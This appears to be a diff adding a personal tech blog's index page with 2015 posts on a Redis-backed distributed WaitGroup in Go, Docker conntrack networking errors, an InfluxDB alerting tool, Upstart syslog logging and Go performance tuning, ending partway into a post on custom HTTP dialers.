+<p>When moving from a single large index to aliased indexes, insertion times went from 500ms-1.5s+ to 50ms on average. Our daily processes that were taking half a day to complete, finishing in less than 15 minutes.</p>
+
+<p>Processing 5k log lines per minute? Now we&rsquo;re processing over 6 million.</p>
+
+<p>Taking the time to understand your database and how each part of it works can be worth the effort especially if you&rsquo;re looking for performance gains.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/11/building-a-distributed-waitgroup-with-go-and-redis/">Building a Distributed WaitGroup With Go and Redis</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-11-08T20:30:07-05:00" pubdate data-updated="true">Nov 8<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>If you&rsquo;ve done any concurrency work in Go you&rsquo;ve used WaitGroups. They&rsquo;re awesome!</p>
+
+<p>Now lets say you have a bunch of workers that do some stuff, but at some point they all need to hit a single API that your rate limited against.</p>
+
+<p>You could move to just using a single process and limiting it that way, but that doesn&rsquo;t scale out very well.</p>
+
+<p>While there are quite a few distributed lock libraries in Go, I didn&rsquo;t find any that worked similarly to WaitGroups, so I set out to write one.</p>
+
+<p>( If you just want the library, head on over to Github <a href="https://github.com/joshrendek/redis-rate-limiter">https://github.com/joshrendek/redis-rate-limiter</a> )</p>
+
+<p>Design goals:</p>
+
+<ul>
+<li>Prevent deadlocks</li>
+<li>Hard limit on concurrency (dont accidentally creep over)</li>
+<li>Keep it simple to use</li>
+<li>Use redis</li>
+<li>Keep the design similar to <code>sync.WaitGroup</code> by using Add() and Done()</li>
+</ul>
+
+
+<p>Initially I started off using <code>INCR</code>/<code>DECR</code> with <code>WATCH</code>. This somewhat worked but was causing the bucket to over-flow and go above the limit I defined.</p>
+
+<p>Eventually I found the <code>SETNX</code> command and decided using a global lock with that around adding was the way to go.</p>
+
+<p>So the final design goes through this flow for Add():</p>
+
+<ol>
+<li>Use SETNX to check if a key exists; loop until it doesn&rsquo;t error (aka the lock is available for acquiring)</li>
+<li>Immediately add an expiration to the lock key once acquired so we don&rsquo;t deadlock</li>
+<li>Check the current number of workers running; wait until it is below the max rate</li>
+<li>Generate a uuid for the worker lock, use this to SET a key and also add to a worker set</li>
+<li>Set an expiration on the worker lock key based on uuid so the worker doesn&rsquo;t deadlock</li>
+<li>Unlock the global lock from SETNX by deleting the key</li>
+<li>Clean old, potentially locked workers</li>
+</ol>
+
+
+<p>Removing is much simpler with Done():</p>
+
+<ol>
+<li>Delete the worker lock key</li>
+<li>Remove the worker lock from the worker set</li>
+</ol>
+
+
+<p>For (1) we want to make sure we don&rsquo;t hammer Redis or the CPU - so we make sure we can pass an option for a sleep duration while busy-waiting.</p>
+
+<p>(2) Prevents the global lock from stalling out if a worker is cancelled in the middle of a lock acquisition.</p>
+
+<p>Waiting for workers in (3) is done by making sure the cardinanality ( <code>SCARD</code> ) of the worker set is less than the worker limit. We loop and wait until this count goes down so we don&rsquo;t exceed our limit.</p>
+
+<p>(4) and (5) uses a UUID library to generate a unique id for the worker lock name/value. This gets added via <code>SADD</code> to the wait group worker set and also set as a key as well.
+We set a key with a TTL based on the UUID so we can remove it from the set via another method if it no longer exists.</p>
+
+<p>(6) frees the global lock allowing other processes to acquire it while they wait in (1).</p>
+
+<p>To clear old locks in (7) we need to take the members in the worker set and then query with <code>EXISTS</code> to see if the key still exists.
+If it doesn&rsquo;t exist but it is still in the set, we know something bad happened. At this point we need to remove it from the
+worker set so that the slot frees up. This will prevent worker deadlocks from happening if it fails to reach the Done() function.</p>
+
+<p>The <code>Add()</code> function returns a UUID string that you then pass to <code>Done(uuid)</code> to remove the worker locks. I think this was the simplest approach for doing this however if you have other ideas let me know!</p>
+
+<p>That&rsquo;s it! We now have a distributed wait group written in go as a library. You can see the source and how to use it over at <a href="https://github.com/joshrendek/redis-rate-limiter">https://github.com/joshrendek/redis-rate-limiter</a>.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/11/docker-and-ping-sendmsg-operation-not-permitted/">Docker and Ping: Sendmsg: Operation Not Permitted</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-11-02T20:30:07-05:00" pubdate data-updated="true">Nov 2<sup>nd</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>You&rsquo;ve raised your file descriptor limits, updated security limits, tweaked your network settings and done everything else in preperation to
+launch your shiny new dockerized application.</p>
+
+<p>Then you have performance issues and you can&rsquo;t understand why, it looks to be network related. Alright! Let&rsquo;s see what&rsquo;s going on:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ping google.com
+</span><span class='line'>unknown host google.com
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Maybe its DNS related&hellip;. Let&rsquo;s try again:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ping 8.8.8.8
+</span><span class='line'>ping: sendmsg: Operation not permitted
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s odd, maybe it&rsquo;s a networking issue outside of our servers. Lets try pinging another host on the subnet:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ping 10.10.0.50
+</span><span class='line'>ping: sendmsg: Operation not permitted
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s even more odd, our other host isn&rsquo;t having network issues at all. Lets try going the other way:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ping 10.10.0.49 <span class="c"># the bad host</span>
+</span><span class='line'><span class="c"># Lots of packet loss</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;re getting a lot of packet loss going from Host B to Host A (the problem machine). Maybe it&rsquo;s a bad NIC?</p>
+
+<p>Just for fun I decided to try and ping localhost/127.0.0.1:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ping 127.0.0.1
+</span><span class='line'>ping: sendmsg: Operation not permitted
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s a new one. What the heck is going on? Now at this point I derped out and didn&rsquo;t think to check <code>dmesg</code>. Lets assume you went down the road I went and derped.</p>
+
+<p>What&rsquo;s the different between host A and B? Well, host B doesn&rsquo;t have docker installed!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>apt-get remove docker-engine<span class="p">;</span> reboot
+</span><span class='line'>
+</span><span class='line'><span class="c"># .... wait for reboot</span>
+</span><span class='line'>
+</span><span class='line'>ping 127.0.0.1
+</span><span class='line'><span class="c"># working</span>
+</span><span class='line'>ping 8.8.8.8
+</span><span class='line'><span class="c"># working</span>
+</span><span class='line'>ping google.com
+</span><span class='line'><span class="c"># working</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>apt-get install docker-engine
+</span><span class='line'>ping 127.0.0.1
+</span><span class='line'>ping: sendmsg: Operation not permitted
+</span><span class='line'>
+</span><span class='line'>ping 8.8.8.8
+</span><span class='line'>ping: sendmsg: Operation not permitted
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Okay so it happens when docker is installed. We&rsquo;ve isolated it. Kernel bug maybe? Queue swapping around kernels and still the same issue happens.</p>
+
+<p>Fun side note: Ubuntu 14.04 has a kernel bug that prevents booting into LVM or software raided grub. <a href="https://bugs.launchpad.net/ubuntu/+source/grub2/+bug/1274320">Launchpad Bug</a></p>
+
+<p>Switching back to the normal kernel (3.13) that comes with 14.04, we proceed. Docker bug? Hit up <code>#docker</code> on Freenode. Someone mentions checking dmesg and conntrack information.</p>
+
+<p>Lo-and-behold, <code>dmesg</code> has tons of these:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>ip_conntrack: table full, dropping packet
+</span><span class='line'><span class="c"># x1000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>How does docker networking work? NAT! That mean&rsquo;s <code>iptables</code> needs to keep track of all your connections, hence the full message.</p>
+
+<p>If you google the original message you&rsquo;ll see a lot of people telling you to check your iptables rules and ACCEPT/INPUT chains to make sure there isn&rsquo;t anything funky in there. If we combine this knowledge + the dmesg errors, we now know what to fix.</p>
+
+<p>Lets update <code>sysctl.conf</code> and reboot for good measure ( you could also apply them with <code>sysctl -p</code> but I wanted to make sure everything was fresh. )</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>net.ipv4.netfilter.ip_conntrack_tcp_timeout_established <span class="o">=</span> 54000
+</span><span class='line'>net.netfilter.nf_conntrack_generic_timeout <span class="o">=</span> 120
+</span><span class='line'>net.netfilter.nf_conntrack_max <span class="o">=</span> 556000
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Adjust the conntrack max until you hit a stable count (556k worked well for me) and don&rsquo;t get anymore connection errors. Start your shiny new docker application that makes tons of network connections and everything should be good now.</p>
+
+<p>Hope this helps someone in the future, as Google really didn&rsquo;t have a lot of useful information on this message + Docker.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/10/influx-alert/">Influx Alert</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-10-12T21:30:07-04:00" pubdate data-updated="true">Oct 12<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I&rsquo;ve been very happy using InfluxDB with Grafana + StatsD but always wanted a nice way to alert on some of the data being fed into statsd/grafana so I wrote a little tool in Go to accomplish that:</p>
+
+<p>Github: <a href="https://github.com/joshrendek/influx-alert">https://github.com/joshrendek/influx-alert</a></p>
+
+<p>I hope someone finds this useful! It&rsquo;s got a few simple functions/comparisons done already and support for HipChat and Slack notifications.</p>
+
+<h1>Documentation</h1>
+
+<h2>Influx Alert</h2>
+
+<p>This is a tool to alert on data that is fed into
+InfluxDB (for example, via statsd) so you can get alerted on it.</p>
+
+<h2>How to get it</h2>
+
+<p>Go to releases, or download the latest here: <a href="https://github.com/joshrendek/influx-alert/releases/download/0.1/influx-alert">v0.1</a></p>
+
+<h2>How to Use</h2>
+
+<ul>
+<li><code>name</code>: the name of the alert ( will be used in notifier )</li>
+<li><code>interval</code>: how often to check influxdb (in seconds)</li>
+<li><code>timeshift</code>: how far back to go (query is like: <code>where time &gt; now() - TIMESHIFT</code></li>
+<li><code>limit</code>: the max number of results to return</li>
+<li><code>type</code>: influxdb (the only option for now)</li>
+<li><code>function</code>: min/max/average are the only supported functions for now</li>
+<li><code>query</code>: the influxdb query to run (omit any limit or where clause on the time)</li>
+<li><code>trigger</code>: the type of trigger and value that would trigger it
+
+<ul>
+<li><code>operator</code>: gt/lt</li>
+<li><code>value</code>: value to compare against (note all values are floats internally)</li>
+</ul>
+</li>
+<li><code>notifiers</code>: an array of notifiers, possible options are slack and hipchat</li>
+</ul>
+
+
+<p>Example: ( see example.yml for more )</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Not Enough Foo</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">influxdb</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">function</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">average</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">timeshift</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1h</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">limit</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">interval</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">query</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">select * from &quot;foo.counter&quot;</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">notifiers</span><span class="p-Indicator">:</span>
+</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">slack</span>
+</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hipchat</span>
+</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">foobar</span>
+</span><span class='line'>  <span class="l-Scalar-Plain">trigger</span><span class="p-Indicator">:</span>
+</span><span class='line'>    <span class="l-Scalar-Plain">operator</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">lt</span>
+</span><span class='line'>    <span class="l-Scalar-Plain">value</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Environment Variables</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>  * INFLUX_HOST
+</span><span class='line'>  * INFLUX_PORT <span class="o">(</span><span class="m">8086</span> is default<span class="o">)</span>
+</span><span class='line'>  * INFLUX_DB
+</span><span class='line'>  * INFLUX_USER
+</span><span class='line'>  * INFLUX_PASS
+</span><span class='line'>  * SLACK_API_TOKEN
+</span><span class='line'>  * SLACK_ROOM
+</span><span class='line'>  * HIPCHAT_API_TOKEN
+</span><span class='line'>  * HIPCHAT_ROOM_ID
+</span><span class='line'>  * HIPCHAT_SERVER <span class="o">(</span>optional<span class="o">)</span>
+</span><span class='line'>  * DEBUG <span class="o">(</span>optional<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Supported Notifiers</h2>
+
+<ul>
+<li>HipChat ( hosted and private servers )</li>
+<li>Slack ( Generate slack token: <a href="https://api.slack.com/web">https://api.slack.com/web</a> )</li>
+</ul>
+
+
+<h2>Supported Backends</h2>
+
+<ul>
+<li>InfluxDB v0.9</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/09/getting-upstart-to-log-to-syslog-with-tags/">Getting Upstart to Log to Syslog With Tags</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-09-23T21:30:07-04:00" pubdate data-updated="true">Sep 23<sup>rd</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I was setting up the ELK stack and had quite a fun time trying to get upstart to log to syslog WITH a log tag ( aka: <code>my-application</code> ) so it could be filtered inside Kibana.</p>
+
+<p>Here is a working example for <code>STDOUT</code> and <code>STDERR</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>respawn
+</span><span class='line'>respawn limit <span class="m">15</span> 5
+</span><span class='line'>
+</span><span class='line'>start on runlevel <span class="o">[</span>2345<span class="o">]</span>
+</span><span class='line'>stop on runlevel <span class="o">[</span>06<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>setuid app-user
+</span><span class='line'>setgid app-user
+</span><span class='line'>
+</span><span class='line'>script
+</span><span class='line'>  <span class="c"># Redirect stdout to syslog</span>
+</span><span class='line'>  mkfifo /tmp/app-stdout-fifo
+</span><span class='line'>  <span class="o">(</span> logger -p user.info -t your-app-tag &lt;/tmp/app-stdout-fifo <span class="p">&amp;</span> <span class="o">)</span>
+</span><span class='line'>  <span class="nb">exec </span>1&gt;/tmp/app-stdout-fifo
+</span><span class='line'>  rm /tmp/app-stdout-fifo
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># Redirect stderr to syslog</span>
+</span><span class='line'>  mkfifo /tmp/app-stderr-fifo
+</span><span class='line'>  <span class="o">(</span> logger -p user.err  -t your-app-tag &lt;/tmp/app-stderr-fifo <span class="p">&amp;</span> <span class="o">)</span>
+</span><span class='line'>  <span class="nb">exec </span>2&gt;/tmp/app-stderr-fifo
+</span><span class='line'>  rm /tmp/app-stderr-fifo
+</span><span class='line'>
+</span><span class='line'>  <span class="nb">exec</span> ./your-app-binary
+</span><span class='line'>end script
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hope this helps someone else, there as a lot of mis-leading and broken examples on Google &amp; StackOverflow.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/09/golang-performance-tips/">Golang Performance Tips</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-09-20T21:30:07-04:00" pubdate data-updated="true">Sep 20<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Below is some advice and notes that I wish I had when writing Go to deal with high amounts of requests (20k+/second). Have any extra tips? Leave them in the comments!</p>
+
+<h2>Kernel Tuning</h2>
+
+<p>Step 1 is making sure your host OS isn&rsquo;t going to keel over when you start making thousands of requests/second or hammering the CPU.</p>
+
+<p>Update <code>/etc/sysctl.conf</code> to have these lines:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>net.ipv4.tcp_tw_reuse <span class="o">=</span> 1
+</span><span class='line'>net.ipv4.tcp_tw_recycle <span class="o">=</span> 1
+</span><span class='line'>net.ipv4.ip_local_port_range <span class="o">=</span> 50000
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>ip_local_port_range</code> - at the default of 30,000 and not modifying the <code>tw_reuse</code> and <code>tw_recycle</code> properties, we&rsquo;re effectively limited to 500 connections/second to a server. If this is still not enough you can configure additional IP&rsquo;s on the server and cycle between them.</p>
+
+<p><code>tcp_tw_reuse</code> will re-use an existing connection that is in <code>TIME-WAIT</code> for outgoing connections.</p>
+
+<p><code>tcp_tw_recycle</code> enables sockets to be recycled faster once they reach the <code>TIME-WAIT</code> state for both incoming and outgoing connections. Make sure you&rsquo;re not running anything through a NAT or this can cause problems with connections.</p>
+
+<p><a href="http://vincent.bernat.im/en/blog/2014-tcp-time-wait-state-linux.html">Vinent Bernat</a> has a great explanation with state diagrams on his blog.</p>
+
+<p>Next up are file descriptors. I prefer defining these in the init or upstart scripts, so you would call <code>ulimit -n 102400</code> and then call your go binary in the upstart script that way it is set before running. (Note: this will only work if the user has been properly given permissions to up their limit in <code>/etc/security/limits.d</code>.</p>
+
+<p><a href="http://upstart.ubuntu.com/wiki/Stanzas#limit">Upstart</a> also provides a mechanism to set file limits in the job stanza.</p>
+
+<h2>Golang Tuning</h2>
+
+<h3>Utilizing all CPUs ( &lt; Go 1.5 )</h3>
+
+<p>You can use all the go-routines in the world and not use all your CPU cores and threads. In order to let your go program utilize all operating-system level threads, we need to tell the go runtime about them:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">runtime</span><span class="p">.</span><span class="nx">GOMAXPROCS</span><span class="p">(</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">NumCPU</span><span class="p">())</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is no longer necessary as of Go 1.5 and is done automatically.</p>
+
+<h3>Finish what you start</h3>
+
+<p>Make sure you call <code>.Close()</code> on your responses, and make sure you read the entire body. The documentation for <code>net/http/response</code> explicitly says that &ldquo;it is the caller&rsquo;s responsibility to close Body&rdquo; and that &ldquo;neither ReadResponse nor Response.Write ever closes a connection.&rdquo; <a href="https://golang.org/src/net/http/response.go">net/http/response.go</a></p>
+
+<h3>Don&rsquo;t be intimidated</h3>
+
+<p>You want to do things fast! But your confused by all the options for concurrency in go. Channels? Goroutines? Libraries to manage them? Stick with a simple worker pattern for best results. I&rsquo;ve found many libraries that claim to manage concurrency for you (limiting running routines, or providing some interface to queueing jobs) fall short, break, or not utilize all CPU cores.</p>
+
+<p>Here is a simple worker pattern that uses nothing but the standard library:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">tasks</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">someDataStruct</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">wg</span> <span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="mi">40</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">wg</span><span class="p">.</span><span class="nx">Add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">for</span> <span class="nx">data</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">tasks</span> <span class="p">{</span>
+</span><span class='line'>          <span class="c1">// do some work on data</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="nx">wg</span><span class="p">.</span><span class="nx">Done</span><span class="p">()</span>
+</span><span class='line'>  <span class="p">}()</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Push to it like this:</span>
+</span><span class='line'><span class="nx">tasks</span> <span class="o">&lt;-</span> <span class="nx">someData</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Finish like this</span>
+</span><span class='line'><span class="nb">close</span><span class="p">(</span><span class="nx">tasks</span><span class="p">)</span>
+</span><span class='line'><span class="nx">wg</span><span class="p">.</span><span class="nx">Wait</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First, we make a channel containing <code>someDataStruct</code> as the type to be sent/received over it. We give it a buffer size of 40. Since we only have 40 routines spinning up, no more than 40 can be worked on at once.</p>
+
+<p>When a caller is trying to push data to this channel and all slots are full, it will block until a slot is free, so keep this in mind and change accordingly if you need to.</p>
+
+<p>Next we make a <code>WaitGroup</code> which will wait for all of our goroutines to finish. When we loop 40 times and say <code>wg.Add(1)</code> we&rsquo;re telling the <code>WaitGroup</code> that we&rsquo;re expecting 40 goroutines, and to wait for them to finish.</p>
+
+<p>Next we iterate over data coming in our <code>tasks</code> channel and do some process on it (this is obviously where your program specific logic or function calls go).</p>
+
+<p>When no more data is available on the channel we call <code>wg.Done()</code> which tells the <code>WaitGroup</code> a routine has finished.</p>
+
+<p>Pushing data is simple by passing an instance of <code>someDataStruct</code> into the <code>tasks</code> channel.</p>
+
+<p>Almost done! We now want to wait for everything to finish before our program exits. <code>close(tasks)</code> marks the channel as closed - and any other callers who try and send to it will get a nice fat error message.</p>
+
+<p>Finally <code>wg.Wait()</code> says to wait until all 40 <code>wg.Done()</code>&rsquo;s have been called.</p>
+
+<h3>Errors</h3>
+
+<p>One of my favorite things about go is that its fast, real fast. Make sure you test, test, and test some more! Always make sure you fail gracefully (if a HTTP connection failed and you need to re-process a job, for instance) and push jobs back onto their queues when a failure is detected. If you have an unexpected race condition or other errors (run out of file descriptors, etc) go will very quickly churn through your job queue.</p>
+
+<h3>But what about&hellip;</h3>
+
+<p>There are lots of other considerations, like what you&rsquo;re running this against. On small elasticsearch clusters using these patterns to send data from go daemons to ES, I&rsquo;ve been able to hit 50k requests/second with still plenty of room to grow.</p>
+
+<p>You may need to pay extra attention to what libraries your using: how many redis connections can you have open? How many do you need?</p>
+
+<p>Are you using keep-alive connections for HTTP? Is your receiver setup properly (nginx configs, etc)?</p>
+
+<p>Is your MySQL or PostgreSQL server tuned to allow this many connections? Make sure you use connection pooling!</p>
+
+<h3>Lastly: Monitor all the things!</h3>
+
+<p>Send your data somewhere. I prefer StatsD, InfluxDB and Grafana for my monitoring stack. There is a ready-to-use go library <a href="https://github.com/quipo/statsd">quipo/statsd</a> that I haven&rsquo;t had issues with. One important thing to do is throw any data sends into a goroutine otherwise you might notice a slowdown while it tries to send the data.</p>
+
+<p>Whether you use Grafana or anything else, its important to monitor. Without metrics on how your systems are running (ops/s, latency, etc) you have no insight into whether or not new changes have affected the overall throughput of your system.</p>
+
+<p>Have any extra tips? Leave them in the comments below!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2015/09/using-a-custom-http-dialer-in-go/">Using a Custom HTTP Dialer in Go</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-09-19T21:30:07-04:00" pubdate data-updated="true">Sep 19<sup>th</sup>, 2015</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Let&rsquo;s make a function to generate an HTTP client for us using a custom dialer:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
